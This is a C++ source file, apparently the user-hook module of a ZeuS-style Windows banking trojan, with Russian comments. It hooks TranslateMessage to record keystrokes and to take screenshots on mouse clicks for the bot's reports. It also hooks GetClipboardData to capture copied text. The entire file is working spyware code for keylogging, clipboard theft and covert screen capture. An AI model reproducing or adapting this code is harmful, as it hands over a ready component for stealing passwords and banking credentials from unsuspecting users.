#include <windows.h>
#include <shlwapi.h>
#include <wininet.h>
#include <ws2tcpip.h>

#include "defines.h"
#include "core.h"
#include "report.h"
#include "userhook.h"
#include "screenshot.h"
#include "cryptedstrings.h"
#include "softwaregrabber.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\debug.h"

static CRITICAL_SECTION userInputCs;

#define USERINPUT_MAX_CHARS 1000

static LPWSTR userInputBuffer;
static WORD userInputBufferSize;

/*
  Добавление строки в буффер ввода.

  IN string - строка для добавления.
*/
static void addString(const LPWSTR string)
{
  int stringSize = Str::_LengthW(string);
  
  //Если строка слишком длинная, эти данные нас врятли интересуют. Поэтому сбрасываем буфер.
  if(stringSize > USERINPUT_MAX_CHARS)UserHook::clearInput();
  else
  {
    CWA(kernel32, EnterCriticalSection)(&userInputCs);
    DWORD newSize = userInputBufferSize + stringSize;
    if(newSize > USERINPUT_MAX_CHARS)
    {
      if(Mem::reallocEx(&userInputBuffer, USERINPUT_MAX_CHARS * sizeof(WCHAR)))
      {
        DWORD savedSize = USERINPUT_MAX_CHARS - stringSize;
        Mem::_copy(userInputBuffer, userInputBuffer + userInputBufferSize - savedSize, savedSize * sizeof(WCHAR));
        Mem::_copy(userInputBuffer + savedSize, string, stringSize * sizeof(WCHAR));
        userInputBufferSize = USERINPUT_MAX_CHARS;
      }
    }
    else if(Mem::reallocEx(&userInputBuffer, newSize * sizeof(WCHAR)))
    {
      Mem::_copy(userInputBuffer + userInputBufferSize, string, stringSize * sizeof(WCHAR));
      userInputBufferSize = newSize;
    }
    CWA(kernel32, LeaveCriticalSection)(&userInputCs);
  }
  
#if(BO_DEBUG > 0)
  {
    LPWSTR str;
    if(UserHook::getInput(&str) > 0)
    {
      WDEBUG2(WDDT_INFO, "userInputBufferSize=%u, userInputBuffer=%s", userInputBufferSize, str);
      Mem::free(str);
    }
  }
#endif
}

static WORD  imageClicksCount;
static LPWSTR imageFilePrefix;

void UserHook::enableImageOnClick(WORD clicksCount, LPSTR filePrefix)
{
  CWA(kernel32, EnterCriticalSection)(&userInputCs);
  imageClicksCount = clicksCount;
  Mem::free(imageFilePrefix);
  imageFilePrefix = (filePrefix == NULL ? NULL : Str::_ansiToUnicodeEx(filePrefix, -1));
  CWA(kernel32, LeaveCriticalSection)(&userInputCs);
}

void UserHook::init(void)
{
  CWA(kernel32, InitializeCriticalSection)(&userInputCs);
  userInputBuffer     = NULL;
  userInputBufferSize = 0;
  imageClicksCount = 0;
  imageFilePrefix  = NULL;
}

void UserHook::uninit(void)
{
  CWA(kernel32, DeleteCriticalSection)(&userInputCs);
  Mem::free(userInputBuffer);
  Mem::free(imageFilePrefix);
}

void UserHook::clearInput(void)
{
  CWA(kernel32, EnterCriticalSection)(&userInputCs);
  Mem::free(userInputBuffer);
  userInputBuffer     = NULL;
  userInputBufferSize = 0;
  CWA(kernel32, LeaveCriticalSection)(&userInputCs);
}

DWORD UserHook::getInput(LPWSTR *buffer)
{
  DWORD retVal = 0;
  *buffer      = NULL;

  CWA(kernel32, EnterCriticalSection)(&userInputCs);
  if(userInputBufferSize > 0 && userInputBuffer != NULL)
  {
    LPWSTR p = Str::_CopyExW(userInputBuffer, userInputBufferSize);
    if(p != NULL)
    {
      *buffer = p;
      retVal = userInputBufferSize;
      
      //Убираем служебные символы.
      for(DWORD i = 0; i < userInputBufferSize; i++)if(p[i] < 0x20)p[i] = 0x20;
    }
  }
  CWA(kernel32, LeaveCriticalSection)(&userInputCs);
  return retVal;
}

BOOL WINAPI UserHook::hookerTranslateMessage(const MSG *msg)
{
  //WDEBUG0(WDDT_INFO, "Called"); //Тормаза дает.
  if(msg != NULL && Core::isActive())
  {
    if(msg->message == WM_LBUTTONDOWN)
    {
      CWA(kernel32, EnterCriticalSection)(&userInputCs);
      if(imageClicksCount > 0)
      {
        imageClicksCount--;
        IStream *stream;        
        {
          CSTR_GETW(imageFormat, userhook_screenshot_format);
          stream = Screenshoot::_screenToIStream(imageFormat, 30, USERCLICK2IMAGE_SIZE);
        }
        
        if(stream != NULL)
        {
          WCHAR path[MAX_PATH];
          {
            CSTR_GETW(pathFormat, userhook_screenshot_path_format);
            CSTR_GETW(defaultPrefix, userhook_screenshot_file_default_prefix);

            Str::_sprintfW(path, MAX_PATH, pathFormat,
                           imageFilePrefix == NULL ? defaultPrefix : imageFilePrefix,
                           coreData.pid,
                           CWA(kernel32, GetTickCount)());
          }
          
          Report::writeIStream(BLT_FILE, NULL, path, stream);
          stream->Release();
        }
      }
      CWA(kernel32, LeaveCriticalSection)(&userInputCs);
    }
    else if(msg->message == WM_KEYDOWN && msg->wParam != VK_ESCAPE)
    {
      BYTE keys[256];
      WCHAR buf[10];
      int count;
      
      if(CWA(user32, GetKeyboardState)(keys) != FALSE && (count = CWA(user32, ToUnicode)(msg->wParam, (msg->lParam >> 16) & 0xFF, keys, buf, sizeof(buf) / sizeof(WCHAR) - 1, 0)) > 0)
      {
        
        if(count == 1 && msg->wParam == VK_BACK)addString(L"\x2190");
        //else if(count == 1 && msg->wParam == VK_DELETE)addString(L"\x2193");
        else if(count > 1 || buf[0] >= 0x20)
        {
          buf[count] = 0;
          addString(buf);
        }
      }
    }
  }
  
  return CWA(user32, TranslateMessage)(msg);
}

HANDLE WINAPI UserHook::hookerGetClipboardData(UINT format)
{
  WDEBUG1(WDDT_INFO, "Called, format=%u", format);

  HANDLE dataHandle = CWA(user32, GetClipboardData)(format);  
  if(!Core::isActive())return dataHandle;
  
  LPBYTE data;
  
  if(dataHandle != NULL && (format == CF_TEXT || format == CF_UNICODETEXT || format == CF_OEMTEXT) && (data = (LPBYTE)CWA(kernel32, GlobalLock)(dataHandle)) != NULL)
  {
    LPWSTR string;
    switch(format)
    {
      case CF_TEXT:        string = Str::_ansiToUnicodeEx((LPSTR)data, -1); break;
      case CF_UNICODETEXT: string = (LPWSTR)data; break;
      case CF_OEMTEXT:     string = Str::_oemToUnicodeEx((LPSTR)data, -1); break;
    }
    
    if(string != NULL)
    {
      CWA(kernel32, EnterCriticalSection)(&userInputCs);
      addString(L" ");
      addString(string);
      CWA(kernel32, LeaveCriticalSection)(&userInputCs);
      if(string != (LPWSTR)data)Mem::free(string);
    }
    
    CWA(kernel32, GlobalUnlock)(dataHandle);
  }

  return dataHandle;
}

#if defined HOOKER_SETWINDOWTEXT
BOOL WINAPI UserHook::hookerSetWindowTextW(HWND window, const LPWSTR string)
{
  return CWA(user32, SetWindowTextW)(window, string);
}
#endif
